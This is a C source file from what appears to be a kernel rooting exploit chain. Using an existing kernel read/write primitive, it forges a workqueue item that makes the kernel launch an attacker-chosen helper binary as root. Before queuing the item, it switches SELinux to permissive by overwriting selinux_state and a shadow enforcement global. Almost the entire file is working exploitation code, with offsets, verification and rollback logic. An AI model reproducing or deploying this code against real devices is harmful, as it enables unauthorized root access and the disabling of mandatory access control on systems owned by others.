/* lib/root/install_umh.c -- see install_umh.h. */
#define _GNU_SOURCE
#include "install_umh.h"

#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

/* pr_info only -- pr_error from the same header exits the process, which
 * would defeat a caller's own retry loop on an ordinary failed attempt. */
#include "../base/util.h"

/* struct work_struct { atomic_long_t data; struct list_head entry;
 * work_func_t func; } padded to 48 bytes, struct subprocess_info and struct
 * completion -- all stable across every kernel version this project
 * targets (5.4 through 6.6); see install_umh.h.
 *
 * Matches include/linux/umh.h's struct subprocess_info field-for-field,
 * including `file` and `pid` -- fields this code never reads or writes
 * itself, but which still occupy real bytes the kernel's own code reads
 * and writes at their real offsets (call_usermodehelper_exec_async(),
 * kernel/umh.c: `if (sub_info->file)`, `sub_info->pid = task_pid_nr(...)`).
 * Omitting them shifts every field after `envp` out from under what the
 * kernel actually touches: `wait` and `retval` land where `file` really
 * is (always NULL here, harmlessly), but `retval` -- the one field this
 * code itself reads back -- lands 8 bytes short, on bytes the kernel
 * never writes at all. */
struct lib_umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  uint64_t file;
  int32_t wait;
  int32_t retval;
  int32_t pid;
  int32_t pad0;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct lib_umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct lib_umh_kernel_data {
  struct lib_umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  char env0[96];
  uint64_t argv[4];
  uint64_t envp[2];
};

_Static_assert(sizeof(struct lib_umh_subprocess_info) == 128,
               "subprocess_info layout");
_Static_assert(sizeof(struct lib_umh_completion) == 32, "completion layout");
_Static_assert(
    sizeof(struct lib_umh_subprocess_info) <= LIB_UMH_DATA_OFF - LIB_UMH_WORK_OFF,
    "fake work item overruns the data area");
_Static_assert(
    sizeof(struct lib_umh_kernel_data) <= LIB_UMH_SCRATCH_SIZE - LIB_UMH_DATA_OFF,
    "kernel_data overruns the scratch region");

static int write_and_verify(
    const struct krw *rw, kdirect_t addr, const void *data, size_t len) {
  uint8_t check[512];
  if (len > sizeof(check)) {
    return 0;
  }
  if (!krw_write(rw, addr, data, len)) {
    return 0;
  }
  if (!krw_read(rw, addr, check, len)) {
    return 0;
  }
  return memcmp(check, data, len) == 0;
}

static int write32_exact(const struct krw *rw, kdirect_t addr, uint32_t value) {
  if (!krw_write(rw, addr, &value, sizeof(value))) {
    return 0;
  }
  uint32_t back = 0;
  return krw_read(rw, addr, &back, sizeof(back)) && back == value;
}

static int is_all_zero(const uint8_t *buf, size_t len) {
  for (size_t i = 0; i < len; i++) {
    if (buf[i]) {
      return 0;
    }
  }
  return 1;
}

/* Opening and closing a pty pair has no bearing on the forged work item; it
 * is purely a nudge to wake an idle worker on system_unbound_wq. Why this
 * specific event does that is not established, only that it does. */
static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 || unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }
  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

int lib_root_install_umh(
    const struct krw *rw, const struct kslide *slide, kdirect_t scratch,
    const char *helper_path, const char *helper_uid, const char *env_entry,
    struct lib_umh_result *out) {
  memset(out, 0, sizeof(*out));
  out->selinux_before = 0xff;
  out->selinux_after = 0xff;

  kdirect_t fake_work_addr = kd_add(scratch, LIB_UMH_WORK_OFF);
  kdirect_t data_addr = kd_add(scratch, LIB_UMH_DATA_OFF);

  /* A page this chain owns but something unexpected already occupies is
   * not safe to forge into -- verified before touching either half of it,
   * not assumed. */
  {
    uint8_t check_work[sizeof(struct lib_umh_subprocess_info)];
    uint8_t check_data[sizeof(struct lib_umh_kernel_data)];
    if (!krw_read(rw, fake_work_addr, check_work, sizeof(check_work)) ||
        !krw_read(rw, data_addr, check_data, sizeof(check_data))) {
      pr_info("umh: scratch pre-read failed\n");
      return 0;
    }
    if (!is_all_zero(check_work, sizeof(check_work)) ||
        !is_all_zero(check_data, sizeof(check_data))) {
      pr_info("umh: scratch not zero work=%d data=%d -- refusing to "
              "overwrite an occupied region\n",
              is_all_zero(check_work, sizeof(check_work)),
              is_all_zero(check_data, sizeof(check_data)));
      return 0;
    }
  }

  struct lib_umh_kernel_data data;
  memset(&data, 0, sizeof(data));
  if (snprintf(data.path, sizeof(data.path), "%s", helper_path) >=
      (int)sizeof(data.path)) {
    pr_info("umh: helper path too long: %s\n", helper_path);
    return 0;
  }
  snprintf(data.arg, sizeof(data.arg), "--umh");
  if (snprintf(data.uid, sizeof(data.uid), "%s", helper_uid) >=
      (int)sizeof(data.uid)) {
    pr_info("umh: helper uid too long: %s\n", helper_uid);
    return 0;
  }
  int have_env = env_entry && env_entry[0];
  if (have_env && snprintf(data.env0, sizeof(data.env0), "%s", env_entry) >=
      (int)sizeof(data.env0)) {
    pr_info("umh: env entry too long: %s\n", env_entry);
    return 0;
  }

  kdirect_t completion_kd = kd_add(data_addr,
      offsetof(struct lib_umh_kernel_data, completion));
  kdirect_t wait_list_kd = kd_add(completion_kd,
      offsetof(struct lib_umh_completion, next));
  kdirect_t path_kd = kd_add(data_addr, offsetof(struct lib_umh_kernel_data, path));
  kdirect_t arg_kd  = kd_add(data_addr, offsetof(struct lib_umh_kernel_data, arg));
  kdirect_t uid_kd  = kd_add(data_addr, offsetof(struct lib_umh_kernel_data, uid));
  kdirect_t env0_kd = kd_add(data_addr, offsetof(struct lib_umh_kernel_data, env0));
  kdirect_t argv_kd = kd_add(data_addr, offsetof(struct lib_umh_kernel_data, argv));
  kdirect_t envp_kd = kd_add(data_addr, offsetof(struct lib_umh_kernel_data, envp));

  data.completion.next = kd_val(wait_list_kd);
  data.completion.prev = kd_val(wait_list_kd);
  data.argv[0] = kd_val(path_kd);
  data.argv[1] = kd_val(arg_kd);
  data.argv[2] = kd_val(uid_kd);
  data.argv[3] = 0;
  data.envp[0] = have_env ? kd_val(env0_kd) : 0;
  data.envp[1] = 0;

  if (!write_and_verify(rw, data_addr, &data, sizeof(data))) {
    pr_info("umh: scratch data write/verify failed base=%016llx\n",
             (unsigned long long)kd_val(data_addr));
    return 0;
  }

  /* The helper the kernel is about to launch is still a real process,
   * subject to SELinux like any other -- root_uid_before/after's own
   * ROOT_METHOD_CRED_PATCH flips this same way, but that method's flip
   * runs in the caller's own context after root; this one has to run
   * before publish, since nothing runs between publish and the kernel
   * actually executing the helper. Flipped back below on any aborted
   * publish; left alone if the item published but never completed, since
   * a kernel thread that may still be running is not one to race a
   * policy change against.
   *
   * Reads/writes the whole leading qword of struct selinux_state
   * (disabled, enforcing, checkreqprot, initialized -- all four bools fit
   * in the first 4 bytes) rather than a single targeted byte at
   * SELINUX_ENFORCING. A field-precise single-byte write depends on every
   * byte of that offset being right; zeroing the qword gets `enforcing`
   * to 0 regardless of exactly where it falls inside it, which tolerates
   * KMI variants whose exact byte offset within the qword differs.
   * selinux_addr is SELINUX_ENFORCING - 1: SELINUX_ENFORCING already
   * points at the `enforcing` byte, so the struct base is one byte
   * before it. */
  kdirect_t selinux_addr =
      kd_add(kd_image_slid(slide, SELINUX_ENFORCING), -1);
  uint64_t selinux_before_qword = 0;
  if (!krw_read(rw, selinux_addr, &selinux_before_qword, sizeof(selinux_before_qword))) {
    pr_info("umh: selinux read failed\n");
    return 0;
  }
  out->selinux_before = (uint8_t)((selinux_before_qword >> 8) & 0xff);

  uint64_t selinux_readback_qword = 0;
  const uint64_t selinux_permissive_qword = 0;
  if (!krw_write(rw, selinux_addr, &selinux_permissive_qword, sizeof(selinux_permissive_qword)) ||
      !krw_read(rw, selinux_addr, &selinux_readback_qword, sizeof(selinux_readback_qword)) ||
      selinux_readback_qword != 0) {
    pr_info("umh: selinux permissive write failed now=%016llx\n",
            (unsigned long long)selinux_readback_qword);
    return 0;
  }
  out->selinux_after = 0;

#ifdef SELINUX_ENFORCING_SHADOW
  /* A target defines this when its enforcing_enabled()/avc_denied() do not
   * consult selinux_state.enforcing above at all, but instead read a
   * separate plain `int` global (see SELINUX_ENFORCING_SHADOW_OFF's
   * target-header comment). The struct-field write above still runs for
   * targets where that field is the real one; this write additionally
   * clears the field such a target's own enforcement actually branches
   * on. */
  kdirect_t shadow_addr = kd_image_slid(slide, SELINUX_ENFORCING_SHADOW);
  uint32_t shadow_before = 0;
  if (!krw_read(rw, shadow_addr, &shadow_before, sizeof(shadow_before))) {
    pr_info("umh: selinux shadow read failed\n");
    return 0;
  }
  const uint32_t shadow_zero = 0;
  uint32_t shadow_readback = 0;
  if (!krw_write(rw, shadow_addr, &shadow_zero, sizeof(shadow_zero)) ||
      !krw_read(rw, shadow_addr, &shadow_readback, sizeof(shadow_readback)) ||
      shadow_readback != 0) {
    pr_info("umh: selinux shadow write failed now=%u\n", shadow_readback);
    return 0;
  }
  /* out->selinux_before/after feed every caller-visible report of this
   * call's own outcome (this function's own log line right below, and
   * root.c/main.c's summary lines). Overwritten here, not left at the
   * struct-field values set above: on a target that defines this macro
   * those struct-field values are vestigial (see the comment above
   * shadow_addr), so reporting them instead of this field would make
   * every one of those lines describe a byte nothing actually reads. */
  out->selinux_before = (shadow_before != 0);
  out->selinux_after = (shadow_readback != 0);
#endif

  /* Independent, same-instant cross-check that does not go through this
   * call's own addressing at all: /sys/fs/selinux/enforce is backed by
   * sel_read_enforce(), which on a target defining SELINUX_ENFORCING_SHADOW
   * reads the shadow global above. If this still reports '1' after a
   * verified shadow write, the write is not reaching what do_execve()
   * actually consults. */
  {
    int probe_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    char probe_c = '?';
    if (probe_fd >= 0) {
      if (read(probe_fd, &probe_c, 1) != 1) {
        probe_c = '?';
      }
      close(probe_fd);
    }
    pr_info("umh: selinux state=%u->%u userspace_enforce=%c\n",
            out->selinux_before, out->selinux_after, probe_c);
  }

  uint64_t umh_work_func = kr_val(k_run(slide, k_image(CALL_USERMODEHELPER_EXEC_WORK_CALLABLE)));

  kdirect_t wq = k_direct_raw(krw_read64(rw, kd_image_slid(slide, SYSTEM_UNBOUND_WQ)));
  if (!kd_is_direct(wq)) {
    pr_info("umh: bad system_unbound_wq=%016llx\n",
             (unsigned long long)kd_val(wq));
    return 0;
  }
  out->wq = kd_val(wq);

  kdirect_t pwq = k_direct_raw(krw_read64(rw, kd_add(wq, WQ_DFL_PWQ_OFF)));
  if (!kd_is_direct(pwq)) {
    pr_info("umh: bad dfl_pwq=%016llx\n", (unsigned long long)kd_val(pwq));
    return 0;
  }
  out->pwq = kd_val(pwq);

  uint64_t pool_v = krw_read64(rw, kd_add(pwq, PWQ_POOL_OFF));
  uint64_t pwq_wq_v = krw_read64(rw, kd_add(pwq, PWQ_WQ_OFF));
  kdirect_t pool = k_direct_raw(pool_v);
  if (!kd_is_direct(pool) || pwq_wq_v != kd_val(wq)) {
    pr_info("umh: bad pool=%016llx pwq_wq=%016llx want=%016llx\n",
             (unsigned long long)pool_v, (unsigned long long)pwq_wq_v,
             (unsigned long long)kd_val(wq));
    return 0;
  }
  out->pool = pool_v;

  kdirect_t worklist = kd_add(pool, POOL_WORKLIST_OFF);
  uint64_t list_next = 0, list_prev = 0;
  uint32_t nr_idle = 0;
  int idle_ok = 0;
  for (int i = 0; i < 200; i++) {
    list_next = krw_read64(rw, worklist);
    list_prev = krw_read64(rw, kd_add(worklist, 8));
    nr_idle = krw_read32(rw, kd_add(pool, POOL_NR_IDLE_OFF));
    if (list_next == kd_val(worklist) && list_prev == kd_val(worklist) &&
        nr_idle > 0) {
      idle_ok = 1;
      break;
    }
    usleep(1000);
  }
  if (!idle_ok) {
    pr_info("umh: pool busy worklist=%016llx/%016llx idle=%u\n",
             (unsigned long long)list_next, (unsigned long long)list_prev,
             nr_idle);
    return 0;
  }

  out->color = krw_read32(rw, kd_add(pwq, PWQ_WORK_COLOR_OFF));
  out->refcnt = krw_read32(rw, kd_add(pwq, PWQ_REFCNT_OFF));
  out->nr_active = krw_read32(rw, kd_add(pwq, PWQ_NR_ACTIVE_OFF));
  out->max_active = krw_read32(rw, kd_add(pwq, PWQ_MAX_ACTIVE_OFF));
  if (out->color >= 16 || out->refcnt == 0 || out->nr_active >= out->max_active) {
    pr_info("umh: bad pwq state color=%u refcnt=%u active=%u/%u\n",
             out->color, out->refcnt, out->nr_active, out->max_active);
    return 0;
  }

  kdirect_t inflight_addr =
    kd_add(pwq, PWQ_NR_IN_FLIGHT_OFF + (int64_t)out->color * 4);
  out->nr_inflight = krw_read32(rw, inflight_addr);
  if (out->nr_inflight == UINT32_MAX || out->nr_active == UINT32_MAX ||
      out->refcnt == UINT32_MAX) {
    pr_info("umh: bad counters inflight=%u active=%u refcnt=%u\n",
             out->nr_inflight, out->nr_active, out->refcnt);
    return 0;
  }

  /* Real kernel state this call never writes -- the real worker thread
   * consults it, still holding pool->lock, right after our forged work
   * item's func returns (pwq_dec_nr_in_flight() -> pwq_activate_first_
   * delayed_work() if this is non-empty and nr_active has room). Read here
   * and again once complete, folded into the two log lines below, so a
   * shot's log says whether this list was ever anything but empty around
   * our publish -- not asserted, since this call does not touch it. */
  kdirect_t delayed_works = kd_add(pwq, PWQ_DELAYED_WORKS_OFF);
  out->delayed_next = krw_read64(rw, delayed_works);
  out->delayed_prev = krw_read64(rw, kd_add(delayed_works, 8));

  kdirect_t fake_entry = kd_add(fake_work_addr, WORK_ENTRY_OFF);
  uint64_t worklist_v = kd_val(worklist);
  uint64_t work_data = kd_val(pwq) | ((uint64_t)out->color << 4) | 5;

  struct lib_umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist_v, sizeof(worklist_v));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t), &worklist_v,
         sizeof(worklist_v));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func, sizeof(umh_work_func));
  fake.complete = kd_val(completion_kd);
  fake.path = kd_val(path_kd);
  fake.argv = kd_val(argv_kd);
  fake.envp = kd_val(envp_kd);

  if (!write_and_verify(rw, fake_work_addr, &fake, sizeof(fake))) {
    pr_info("umh: fake work write/verify failed addr=%016llx\n",
             (unsigned long long)kd_val(fake_work_addr));
    return 0;
  }

  /*
   * Every write from here on lands on live, shared kernel state (the
   * pool's own counters and its worklist), not on scratch memory -- an
   * abort past this point has to undo exactly what it already did, not
   * merely return 0, or the next legitimate list_add/list_del on this pool
   * corrupts: a worklist.prev left pointing at fake_entry trips
   * `kernel BUG at lib/list_debug.c` the next time an unrelated work item
   * is queued on this same pool. Tracked one write at a time, not
   * short-circuited, so rollback knows exactly what to undo.
   */
  uint64_t fake_entry_v = kd_val(fake_entry);
  int inflight_written = write32_exact(rw, inflight_addr, out->nr_inflight + 1);
  int active_written = inflight_written &&
      write32_exact(rw, kd_add(pwq, PWQ_NR_ACTIVE_OFF), out->nr_active + 1);
  int refcnt_written = active_written &&
      write32_exact(rw, kd_add(pwq, PWQ_REFCNT_OFF), out->refcnt + 1);
  int prev_written = refcnt_written &&
      krw_write64(rw, kd_add(worklist, 8), fake_entry_v);

  const char *abort_reason = NULL;
  if (!prev_written) {
    abort_reason = "prepublish write failed";
  } else if (krw_read64(rw, worklist) != worklist_v) {
    abort_reason = "worklist changed before publish";
  } else {
    krw_write64(rw, worklist, fake_entry_v);
    if (krw_read64(rw, worklist) != fake_entry_v) {
      abort_reason = "publish readback mismatch";
    }
  }

  if (!abort_reason) {
    out->published = 1;
  } else {
    pr_info("umh: publish aborted (%s) inflight=%d active=%d refcnt=%d "
            "prev=%d -- rolling back\n",
            abort_reason, inflight_written, active_written, refcnt_written,
            prev_written);
    /* Only restore worklist.prev if it is still ours: a concurrent
     * list_add_tail() on this same pool may already have overwritten it
     * with a real entry, and that write is correct -- clobbering it back
     * to worklist_v would be the same corruption from the other side. */
    if (prev_written && krw_read64(rw, kd_add(worklist, 8)) == fake_entry_v) {
      krw_write64(rw, kd_add(worklist, 8), worklist_v);
    }
    if (refcnt_written) {
      write32_exact(rw, kd_add(pwq, PWQ_REFCNT_OFF), out->refcnt);
    }
    if (active_written) {
      write32_exact(rw, kd_add(pwq, PWQ_NR_ACTIVE_OFF), out->nr_active);
    }
    if (inflight_written) {
      write32_exact(rw, inflight_addr, out->nr_inflight);
    }
    krw_write(rw, selinux_addr, &selinux_before_qword,
              sizeof(selinux_before_qword));
    uint64_t rollback_qword = 0;
    krw_read(rw, selinux_addr, &rollback_qword, sizeof(rollback_qword));
    out->selinux_after = (uint8_t)((rollback_qword >> 8) & 0xff);
#ifdef SELINUX_ENFORCING_SHADOW
    krw_write(rw, shadow_addr, &shadow_before, sizeof(shadow_before));
    uint32_t shadow_rollback = 0;
    krw_read(rw, shadow_addr, &shadow_rollback, sizeof(shadow_rollback));
    /* Same reasoning as the successful-write path above: report the field
     * this build's enforcement actually reads, not the struct field. */
    out->selinux_after = (shadow_rollback != 0);
#endif
    return 0;
  }
  pr_info("umh: published wq=%016llx pwq=%016llx pool=%016llx work=%016llx "
          "color=%u counters=%u/%u/%u delayed=%016llx/%016llx\n",
          (unsigned long long)out->wq, (unsigned long long)out->pwq,
          (unsigned long long)out->pool,
          (unsigned long long)kd_val(fake_work_addr), out->color,
          out->nr_inflight, out->nr_active, out->refcnt,
          (unsigned long long)out->delayed_next,
          (unsigned long long)out->delayed_prev);

  for (int i = 0; i < 8 && !out->complete; i++) {
    wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      out->complete = krw_read32(rw, completion_kd);
      if (out->complete) {
        break;
      }
      usleep(1000);
    }
  }
  if (!out->complete) {
    pr_info("umh: work never completed\n");
    return 0;
  }

  out->retval = (int32_t)krw_read32(
      rw, kd_add(fake_work_addr,
                 offsetof(struct lib_umh_subprocess_info, retval)));
  out->delayed_next_after = krw_read64(rw, delayed_works);
  out->delayed_prev_after = krw_read64(rw, kd_add(delayed_works, 8));
  pr_info("umh: complete retval=%d delayed=%016llx/%016llx\n", out->retval,
          (unsigned long long)out->delayed_next_after,
          (unsigned long long)out->delayed_prev_after);
  out->ok = 1;
  return 1;
}
